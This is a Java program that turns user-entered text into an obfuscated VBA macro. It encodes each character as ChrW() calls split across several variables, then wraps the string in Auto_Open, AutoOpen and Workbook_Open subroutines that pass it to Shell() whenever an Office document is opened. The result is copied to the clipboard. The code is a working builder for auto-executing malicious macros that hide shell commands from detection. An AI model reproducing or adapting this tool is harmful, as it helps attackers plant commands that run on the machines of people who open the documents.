import javax.swing.*;
import java.awt.datatransfer.*;
import java.awt.Toolkit;

public class Obfuscate
{
    public static void main(String [] args)
    {
        JFrame frame = new JFrame("User Input");
        
        String input = JOptionPane.showInputDialog(frame, "Input Normal Text");
        String obfuscated = "Sub Auto_Open()\n    Dim first As String\n";
        
        if(input.length() > 10)
        {
            obfuscated += "    Dim second As String\n";
        }
        if(input.length() > 20)
        {
            obfuscated += "    Dim third As String\n";
        }
        if(input.length() > 30)
        {
            obfuscated += "    Dim fourth As String\n";
        }
        if(input.length() > 40)
        {
            obfuscated += "    Dim fifth As String\n";
        }
        if(input.length() > 50)
        {
            obfuscated += "    Dim sixth As String\n";
        }
        if(input.length() > 60)
        {
            obfuscated += "    Dim seventh As String\n";
        }
        if(input.length() > 70)
        {
            obfuscated += "    Dim eighth As String\n";
        }
        if(input.length() > 80)
        {
            obfuscated += "    Dim ninth As String\n";
        }
        if(input.length() > 90)
        {
            obfuscated += "    Dim tenth As String\n";
        }
        if(input.length() > 100)
        {
            obfuscated += "    Dim eleventh As String\n";
        }
        if(input.length() > 110)
        {
            obfuscated += "    Dim twelfth As String\n";
        }
        
        obfuscated += "    Dim last As String\n";
        obfuscated += "    first = ";
        
        for(int i = 0; i < input.length(); i++)
        {
            obfuscated += "ChrW(";
            obfuscated += (int)input.charAt(i);
            obfuscated += ") & ";
            if(i == 9 && input.length() > 10)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    second = ";
            }
            if(i == 19 && input.length() > 20)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    third = ";
            }
            if(i == 29 && input.length() > 30)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    fourth = ";
            }
            if(i == 39 && input.length() > 40)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    fifth = ";
            }
            if(i == 49 && input.length() > 50)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    sixth = ";
            }
            if(i == 59 && input.length() > 60)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    seventh = ";
            }
            if(i == 69 && input.length() > 70)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    eighth = ";
            }
            if(i == 79 && input.length() > 80)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    ninth = ";
            }
            if(i == 89 && input.length() > 90)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    tenth = ";
            }
            if(i == 99 && input.length() > 100)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    eleventh = ";
            }
            if(i == 109 && input.length() > 110)
            {
                obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
                obfuscated += "\n";
                obfuscated += "    twelfth = ";
            }
        }
        
        obfuscated = obfuscated.substring(0, obfuscated.length() - 3);
        obfuscated += "\n    last = first";
        
        if(input.length() > 10)
        {
            obfuscated += " + second";
        }
        if(input.length() > 20)
        {
            obfuscated += " + third";
        }
        if(input.length() > 30)
        {
            obfuscated += " + fourth";
        }
        if(input.length() > 40)
        {
            obfuscated += " + fifth";
        }
        if(input.length() > 50)
        {
            obfuscated += " + sixth";
        }
        if(input.length() > 60)
        {
            obfuscated += " + seventh";
        }
        if(input.length() > 70)
        {
            obfuscated += " + eighth";
        }
        if(input.length() > 80)
        {
            obfuscated += " + ninth";
        }
        if(input.length() > 90)
        {
            obfuscated += " + tenth";
        }
        if(input.length() > 100)
        {
            obfuscated += " + eleventh";
        }
        if(input.length() > 110)
        {
            obfuscated += " + twelfth";
        }
        
        obfuscated += "\n    Shell(last)\nEnd Sub\nSub AutoOpen()\n    Auto_Open\nEnd Sub\nSub Workbook_Open()\n    Auto_Open\nEnd Sub";
        
        StringSelection stringSelection = new StringSelection(obfuscated);
        Clipboard userClipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
        userClipboard.setContents(stringSelection, null);
        
        JOptionPane.showMessageDialog(frame, obfuscated, "Output - Copied To Clipboard", JOptionPane.PLAIN_MESSAGE);
        System.exit(0);
    }
}
